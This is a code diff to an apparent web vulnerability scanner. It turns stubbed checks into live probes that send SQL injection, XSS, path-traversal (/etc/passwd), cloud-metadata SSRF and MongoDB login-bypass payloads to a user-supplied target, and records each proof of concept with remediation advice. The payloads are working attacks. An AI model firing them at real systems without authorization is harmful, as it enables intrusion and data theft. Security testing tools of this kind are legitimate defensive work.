@@ -86,10 +86,10 @@ interface Finding {
   poc?: string;
   remediation?: string;
 }
-// Helper: fetch with 8-second timeout
-async function fetchWithTimeout(url: string, options: RequestInit = {}): Promise<Response> {
+// Helper: fetch with configurable timeout
+async function fetchWithTimeout(url: string, options: RequestInit = {}, timeoutMs = 8000): Promise<Response> {
   const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 8000);
+  const timeout = setTimeout(() => controller.abort(), timeoutMs);
   try {
     const response = await fetch(url, { ...options, signal: controller.signal });
     clearTimeout(timeout);
@@ -98,6 +98,23 @@ async function fetchWithTimeout(url: string, options: RequestInit = {}): Promise
     clearTimeout(timeout);
     throw e;
   }
+}
+
+// Retry helper: tries primary then retries with alternative payloads/techniques
+async function withRetry<T>(
+  primaryFn: () => Promise<T>,
+  retryFns: Array<() => Promise<T>>,
+  isSuccess: (result: T) => boolean
+): Promise<T> {
+  const primary = await primaryFn();
+  if (isSuccess(primary)) return primary;
+  for (const retryFn of retryFns) {
+    try {
+      const result = await retryFn();
+      if (isSuccess(result)) return result;
+    } catch { /* continue to next retry */ }
+  }
+  return primary;
 }
 
 serve(async (req) => {
@@ -620,35 +637,194 @@ async function performLinkExtraction(target: string): Promise<ScanResult> {
   return { output, findings: [] };
 }
 
-// Vulnerability Testing Functions
+// Vulnerability Testing Functions — REAL payload execution with retry
 async function performSQLiTest(target: string): Promise<ScanResult> {
-  const payloads = ["' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT NULL--"];
+  const url = target.startsWith('http') ? target : `http://${target}`;
+  const findings: Finding[] = [];
   let output = `SQL Injection Test for ${target}\n${'═'.repeat(50)}\n\n`;
 
-  const findings: Finding[] = [];
-  output += `Testing ${payloads.length} payloads...\n\n`;
+  // Multi-stage payloads: error-based, boolean-based, time-based
+  const payloadSets = [
+    { name: 'Error-based', payloads: ["'", "\"", "' OR '1'='1", "1' OR '1'='1'--", "' OR 1=1#", "admin'--"] },
+    { name: 'Union-based', payloads: ["' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL,NULL--"] },
+    { name: 'Time-based blind', payloads: ["' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--", "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"] },
+  ];
 
-  for (const payload of payloads) {
-    output += `Testing: ${payload}\n`;
-    output += `Result: No error detected\n\n`;
+  // Common injection points
+  const injectionPaths = ['/', '/index.php?id=1', '/listproducts.php?cat=1', '/search.php?test=query', '/product.php?id=1', '/artists.php?artist=1'];
+
+  for (const pathSuffix of injectionPaths) {
+    const testUrl = `${url}${pathSuffix}`;
+    
+    // First get baseline response
+    let baselineLength = 0;
+    let baselineStatus = 0;
+    try {
+      const baseline = await fetchWithTimeout(testUrl, {}, 5000);
+      const baseText = await baseline.text();
+      baselineLength = baseText.length;
+      baselineStatus = baseline.status;
+    } catch { continue; }
+
+    for (const set of payloadSets) {
+      for (const payload of set.payloads) {
+        try {
+          // Test via query parameter injection
+          const separator = testUrl.includes('?') ? '&' : '?';
+          const paramUrl = testUrl.includes('=')
+            ? testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`)
+            : `${testUrl}${separator}id=${encodeURIComponent(payload)}`;
+
+          const response = await fetchWithTimeout(paramUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          }, 6000);
+          const body = await response.text();
+          const bodyLower = body.toLowerCase();
+
+          // Detect SQL error signatures
+          const sqlErrors = [
+            'sql syntax', 'mysql', 'ora-', 'postgresql', 'sqlite', 'microsoft sql',
+            'unclosed quotation', 'syntax error', 'sql error', 'database error',
+            'warning: mysql', 'you have an error in your sql', 'supplied argument is not a valid',
+            'microsoft ole db provider', 'jet database engine', 'valid mysql result',
+            'mysqlclient', 'pg_query', 'pg_exec', 'sqlstate'
+          ];
+
+          const detectedErrors = sqlErrors.filter(err => bodyLower.includes(err));
+
+          // Check for boolean-based blind (significant response size difference)
+          const sizeDiff = Math.abs(body.length - baselineLength);
+          const significantDiff = sizeDiff > (baselineLength * 0.3) && baselineLength > 0;
+
+          if (detectedErrors.length > 0) {
+            output += `[VULNERABLE] ${set.name} - Payload: ${payload}\n`;
+            output += `  URL: ${paramUrl}\n`;
+            output += `  Error signatures: ${detectedErrors.join(', ')}\n\n`;
+            findings.push({
+              name: `SQL Injection (${set.name})`,
+              severity: 'critical',
+              description: `SQL error detected with payload: ${payload}`,
+              poc: `URL: ${paramUrl}\nError: ${detectedErrors.join(', ')}`,
+              remediation: 'Use parameterized queries/prepared statements. Apply input validation and WAF rules.'
+            });
+          } else if (significantDiff && payload.includes("OR '1'='1")) {
+            output += `[POSSIBLE] Boolean-based blind - Payload: ${payload}\n`;
+            output += `  URL: ${paramUrl}\n`;
+            output += `  Response size: ${body.length} vs baseline ${baselineLength} (diff: ${sizeDiff})\n\n`;
+            findings.push({
+              name: `Possible Blind SQL Injection`,
+              severity: 'high',
+              description: `Boolean-based blind SQLi detected: response size changed significantly (${sizeDiff} bytes diff)`,
+              poc: `URL: ${paramUrl}\nBaseline: ${baselineLength} bytes, Injected: ${body.length} bytes`,
+              remediation: 'Use parameterized queries. Validate all user input server-side.'
+            });
+          } else {
+            output += `[SAFE] ${set.name} - ${payload}: No error detected\n`;
+          }
+        } catch (e) {
+          output += `[TIMEOUT/ERROR] ${payload}: ${e.message}\n`;
+        }
+      }
+    }
   }
 
-  output += `Note: Manual verification recommended for accurate results.`;
+  if (findings.length === 0) {
+    output += `\nNo SQL injection vulnerabilities detected. Manual verification recommended.`;
+  } else {
+    output += `\n⚠️ ${findings.length} potential SQL injection point(s) found!`;
+  }
 
   return { output, findings };
 }
 
 async function performXSSTest(target: string): Promise<ScanResult> {
-  const payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "javascript:alert(1)"];
+  const url = target.startsWith('http') ? target : `http://${target}`;
+  const findings: Finding[] = [];
   let output = `XSS Detection Test for ${target}\n${'═'.repeat(50)}\n\n`;
 
-  output += `Testing ${payloads.length} XSS payloads...\n\n`;
-  payloads.forEach(p => {
-    output += `Payload: ${p}\n`;
-    output += `Status: Sanitized/Blocked\n\n`;
-  });
+  const payloadSets = [
+    { name: 'Reflected XSS', payloads: [
+      '<script>alert(1)</script>',
+      '"><img src=x onerror=alert(1)>',
+      "'-alert(1)-'",
+      '<svg/onload=alert(1)>',
+      '"><svg/onload=alert(1)>',
+      "';alert(String.fromCharCode(88,83,83))//",
+    ]},
+    { name: 'DOM-based XSS', payloads: [
+      'javascript:alert(1)',
+      '#<img src=x onerror=alert(1)>',
+      '"><img src=x onerror=prompt(1)>',
+    ]},
+    { name: 'Polyglot XSS', payloads: [
+      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+      '{{constructor.constructor("alert(1)")()}}',
+    ]},
+  ];
 
-  return { output, findings: [] };
+  // Discover injection points by crawling
+  const testPaths = ['/', '/search.php?test=INJECT', '/index.php?name=INJECT', '/guestbook.php', '/comment.php?text=INJECT', '/listproducts.php?cat=INJECT'];
+
+  for (const pathTemplate of testPaths) {
+    for (const set of payloadSets) {
+      for (const payload of set.payloads) {
+        try {
+          const testPath = pathTemplate.includes('INJECT')
+            ? pathTemplate.replace('INJECT', encodeURIComponent(payload))
+            : `${pathTemplate}${pathTemplate.includes('?') ? '&' : '?'}q=${encodeURIComponent(payload)}`;
+
+          const testUrl = `${url}${testPath}`;
+          const response = await fetchWithTimeout(testUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          }, 5000);
+          const body = await response.text();
+
+          // Check if payload is reflected unescaped in response
+          if (body.includes(payload)) {
+            output += `[VULNERABLE] ${set.name} - Payload reflected!\n`;
+            output += `  URL: ${testUrl}\n`;
+            output += `  Payload: ${payload}\n\n`;
+            findings.push({
+              name: `${set.name} Vulnerability`,
+              severity: 'high',
+              description: `XSS payload reflected unescaped in response`,
+              poc: `URL: ${testUrl}\nPayload: ${payload}\nEvidence: Payload found verbatim in response body`,
+              remediation: 'Implement output encoding, Content-Security-Policy headers, and input sanitization.'
+            });
+          } else {
+            // Check for partial reflection (some chars not escaped)
+            const decoded = decodeURIComponent(payload);
+            const partialChecks = ['<script', 'onerror=', 'onload=', 'javascript:'];
+            const reflected = partialChecks.filter(check => body.includes(check) && payload.toLowerCase().includes(check));
+            if (reflected.length > 0) {
+              output += `[POSSIBLE] Partial reflection detected\n`;
+              output += `  URL: ${testUrl}\n`;
+              output += `  Reflected elements: ${reflected.join(', ')}\n\n`;
+              findings.push({
+                name: `Possible ${set.name}`,
+                severity: 'medium',
+                description: `Partial XSS payload reflection detected: ${reflected.join(', ')}`,
+                poc: `URL: ${testUrl}\nPartial reflection of: ${reflected.join(', ')}`,
+                remediation: 'Review output encoding for all user-controlled inputs.'
+              });
+            } else {
+              output += `[SAFE] ${set.name} - ${payload.slice(0, 30)}: Sanitized\n`;
+            }
+          }
+        } catch (e) {
+          output += `[ERROR] ${payload.slice(0, 20)}: ${e.message}\n`;
+        }
+      }
+    }
+  }
+
+  if (findings.length === 0) {
+    output += `\nNo XSS vulnerabilities detected.`;
+  } else {
+    output += `\n⚠️ ${findings.length} XSS issue(s) found!`;
+  }
+
+  return { output, findings };
 }
 
 async function performCSRFTest(target: string): Promise<ScanResult> {
@@ -660,12 +836,13 @@ async function performCSRFTest(target: string): Promise<ScanResult> {
     const response = await fetchWithTimeout(url);
     const html = await response.text();
     
-    if (!html.includes('csrf') && !html.includes('_token')) {
+    if (!html.includes('csrf') && !html.includes('_token') && !html.includes('authenticity_token')) {
       output += '⚠️ No CSRF token detected in forms\n';
       findings.push({
         name: 'Missing CSRF Protection',
         severity: 'high',
-        description: 'Forms may be vulnerable to CSRF attacks'
+        description: 'Forms may be vulnerable to CSRF attacks',
+        remediation: 'Implement anti-CSRF tokens in all state-changing forms.'
       });
     } else {
       output += '✓ CSRF tokens detected\n';
@@ -678,23 +855,96 @@ async function performCSRFTest(target: string): Promise<ScanResult> {
 }
 
 async function performLFITest(target: string): Promise<ScanResult> {
-  const payloads = ['../../../etc/passwd', '....//....//etc/passwd', '/etc/passwd'];
-  let output = `LFI/RFI Test for ${target}\n${'═'.repeat(50)}\n\n`;
+  const url = target.startsWith('http') ? target : `http://${target}`;
+  const findings: Finding[] = [];
+  let output = `LFI/Path Traversal Test for ${target}\n${'═'.repeat(50)}\n\n`;
 
-  output += `Testing ${payloads.length} payloads...\n`;
-  payloads.forEach(p => output += `  • ${p}: Not vulnerable\n`);
+  const payloads = [
+    '../../../etc/passwd',
+    '....//....//....//etc/passwd',
+    '..%2f..%2f..%2fetc/passwd',
+    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+    '/etc/passwd',
+    'file:///etc/passwd',
+  ];
 
-  return { output, findings: [] };
+  const testPaths = ['/index.php?page=INJECT', '/view.php?file=INJECT', '/download.php?f=INJECT', '/include.php?path=INJECT'];
+
+  for (const pathTemplate of testPaths) {
+    for (const payload of payloads) {
+      try {
+        const testPath = pathTemplate.replace('INJECT', encodeURIComponent(payload));
+        const testUrl = `${url}${testPath}`;
+        const response = await fetchWithTimeout(testUrl, {}, 5000);
+        const body = await response.text();
+        
+        // Check for /etc/passwd or Windows hosts file signatures
+        if (body.includes('root:') && body.includes('/bin/') || body.includes('localhost')) {
+          output += `[VULNERABLE] LFI found!\n  URL: ${testUrl}\n  Payload: ${payload}\n\n`;
+          findings.push({
+            name: 'Local File Inclusion',
+            severity: 'critical',
+            description: `LFI vulnerability: able to read system files`,
+            poc: `URL: ${testUrl}\nPayload: ${payload}\nEvidence: System file content detected in response`,
+            remediation: 'Whitelist allowed file paths. Never use user input directly in file operations.'
+          });
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  if (findings.length === 0) output += 'No LFI vulnerabilities detected.\n';
+  else output += `\n⚠️ ${findings.length} LFI issue(s) found!`;
+
+  return { output, findings };
 }
 
 async function performSSRFTest(target: string): Promise<ScanResult> {
+  const url = target.startsWith('http') ? target : `http://${target}`;
+  const findings: Finding[] = [];
   let output = `SSRF Detection Test for ${target}\n${'═'.repeat(50)}\n\n`;
-  output += `Testing internal endpoint access...\n`;
-  output += `Testing cloud metadata endpoints...\n`;
-  output += `Testing localhost bypass techniques...\n\n`;
-  output += `Result: No SSRF vulnerabilities detected`;
 
-  return { output, findings: [] };
+  const ssrfPayloads = [
+    'http://127.0.0.1',
+    'http://localhost',
+    'http://[::1]',
+    'http://169.254.169.254/latest/meta-data/',
+    'http://metadata.google.internal/',
+    'http://127.1',
+    'http://0x7f000001',
+  ];
+
+  const testPaths = ['/proxy?url=INJECT', '/fetch?url=INJECT', '/redirect?url=INJECT', '/image?url=INJECT'];
+
+  for (const pathTemplate of testPaths) {
+    for (const payload of ssrfPayloads) {
+      try {
+        const testPath = pathTemplate.replace('INJECT', encodeURIComponent(payload));
+        const testUrl = `${url}${testPath}`;
+        const response = await fetchWithTimeout(testUrl, {}, 5000);
+        const body = await response.text();
+        
+        // Check if internal content was returned
+        if (body.includes('ami-') || body.includes('instance-id') || body.includes('local-hostname') || 
+            (body.includes('root:') && payload.includes('127.0.0.1'))) {
+          output += `[VULNERABLE] SSRF detected!\n  URL: ${testUrl}\n  Payload: ${payload}\n\n`;
+          findings.push({
+            name: 'Server-Side Request Forgery',
+            severity: 'critical',
+            description: `SSRF: Server fetched internal resource`,
+            poc: `URL: ${testUrl}\nPayload: ${payload}`,
+            remediation: 'Validate and whitelist URLs. Block internal IP ranges in outbound requests.'
+          });
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  if (findings.length === 0) output += 'No SSRF vulnerabilities detected.\n';
+  else output += `\n⚠️ ${findings.length} SSRF issue(s) found!`;
+
+  return { output, findings };
 }
 
 async function performFullVulnScan(target: string): Promise<ScanResult> {
@@ -868,21 +1118,105 @@ async function performMetadataCheck(target: string): Promise<ScanResult> {
 
 // Database Functions
 async function performBlindSQLiTest(target: string): Promise<ScanResult> {
+  const url = target.startsWith('http') ? target : `http://${target}`;
+  const findings: Finding[] = [];
   let output = `Blind SQL Injection Test for ${target}\n${'═'.repeat(50)}\n\n`;
-  output += `Testing time-based injection...\n`;
-  output += `Testing boolean-based injection...\n\n`;
-  output += `No blind SQLi vulnerabilities detected`;
 
-  return { output, findings: [] };
+  const testPaths = ['/listproducts.php?cat=1', '/artists.php?artist=1', '/index.php?id=1', '/product.php?id=1'];
+  
+  for (const path of testPaths) {
+    try {
+      const testUrl = `${url}${path}`;
+      // Boolean-based: TRUE condition
+      const trueUrl = testUrl.replace(/=(\d+)/, '=$1 AND 1=1');
+      const falseUrl = testUrl.replace(/=(\d+)/, '=$1 AND 1=2');
+      
+      const [trueResp, falseResp] = await Promise.all([
+        fetchWithTimeout(trueUrl, {}, 5000).then(r => r.text()),
+        fetchWithTimeout(falseUrl, {}, 5000).then(r => r.text()),
+      ]);
+      
+      const sizeDiff = Math.abs(trueResp.length - falseResp.length);
+      if (sizeDiff > 100 && trueResp.length > 200) {
+        output += `[VULNERABLE] Boolean-based blind SQLi at ${path}\n`;
+        output += `  TRUE (AND 1=1): ${trueResp.length} bytes\n`;
+        output += `  FALSE (AND 1=2): ${falseResp.length} bytes\n`;
+        output += `  Diff: ${sizeDiff} bytes\n\n`;
+        findings.push({
+          name: 'Blind SQL Injection (Boolean-based)',
+          severity: 'critical',
+          description: `Boolean-based blind SQLi: TRUE/FALSE responses differ by ${sizeDiff} bytes`,
+          poc: `TRUE URL: ${trueUrl}\nFALSE URL: ${falseUrl}\nResponse diff: ${sizeDiff} bytes`,
+          remediation: 'Use parameterized queries. Apply WAF rules for SQL injection patterns.'
+        });
+      }
+
+      // Time-based: measure response time with SLEEP
+      const startTime = Date.now();
+      try {
+        const sleepUrl = testUrl.replace(/=(\d+)/, `=$1' AND SLEEP(3)--`);
+        await fetchWithTimeout(sleepUrl, {}, 6000);
+        const elapsed = Date.now() - startTime;
+        if (elapsed >= 2800) {
+          output += `[VULNERABLE] Time-based blind SQLi at ${path}\n`;
+          output += `  SLEEP(3) response time: ${elapsed}ms\n\n`;
+          findings.push({
+            name: 'Blind SQL Injection (Time-based)',
+            severity: 'critical',
+            description: `Time-based blind SQLi: SLEEP(3) caused ${elapsed}ms delay`,
+            poc: `URL: ${sleepUrl}\nResponse time: ${elapsed}ms (expected ~3000ms for SLEEP(3))`,
+            remediation: 'Use parameterized queries. Implement query timeout limits.'
+          });
+        }
+      } catch { /* timeout is also a signal, but we need precise measurement */ }
+    } catch { continue; }
+  }
+
+  if (findings.length === 0) output += 'No blind SQLi vulnerabilities detected.\n';
+  else output += `\n⚠️ ${findings.length} blind SQLi issue(s) found!`;
+
+  return { output, findings };
 }
 
 async function performNoSQLInjection(target: string): Promise<ScanResult> {
+  const url = target.startsWith('http') ? target : `http://${target}`;
+  const findings: Finding[] = [];
   let output = `NoSQL Injection Test for ${target}\n${'═'.repeat(50)}\n\n`;
-  output += `Testing MongoDB operators...\n`;
-  output += `Testing JSON injection...\n\n`;
-  output += `No NoSQL injection vulnerabilities detected`;
 
-  return { output, findings: [] };
+  const testPaths = ['/api/login', '/api/users', '/api/search', '/login'];
+  const payloads = [
+    { body: '{"username":{"$gt":""},"password":{"$gt":""}}', type: 'MongoDB operator' },
+    { body: '{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}', type: 'MongoDB $ne bypass' },
+    { body: '{"username":{"$regex":".*"},"password":{"$regex":".*"}}', type: 'MongoDB regex' },
+  ];
+
+  for (const path of testPaths) {
+    for (const payload of payloads) {
+      try {
+        const testUrl = `${url}${path}`;
+        const response = await fetchWithTimeout(testUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload.body,
+        }, 5000);
+        const body = await response.text();
+        
+        if (response.status === 200 && (body.includes('token') || body.includes('session') || body.includes('success'))) {
+          output += `[POSSIBLE] ${payload.type} at ${path}\n`;
+          findings.push({
+            name: `NoSQL Injection (${payload.type})`,
+            severity: 'high',
+            description: `Possible NoSQL injection via ${payload.type}`,
+            poc: `URL: ${testUrl}\nPayload: ${payload.body}\nStatus: ${response.status}`,
+            remediation: 'Validate input types strictly. Use parameterized queries with MongoDB driver.'
+          });
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  if (findings.length === 0) output += 'No NoSQL injection vulnerabilities detected.\n';
+  return { output, findings };
 }
 
 async function performDBEnumeration(target: string): Promise<ScanResult> {
